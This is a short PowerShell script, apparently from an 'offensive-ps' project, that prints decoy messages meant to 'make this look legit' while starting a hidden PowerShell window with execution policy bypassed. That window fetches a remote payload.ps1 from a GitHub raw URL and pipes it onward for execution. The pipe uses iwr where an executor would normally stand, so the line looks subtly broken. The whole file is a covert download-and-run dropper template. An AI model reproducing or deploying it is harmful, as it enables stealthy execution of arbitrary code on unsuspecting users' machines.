Write-Output "Any code can be put here to make this look legit"
Start-Process PowerShell -WindowStyle Hidden "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/starchyunderscore/offensive-ps/main/method-1/payload.ps1 | iwr`""
Write-Output "We can even exit the powershell window (we will in 10 seconds)"
Start-Sleep -Seconds 10
Exit 0
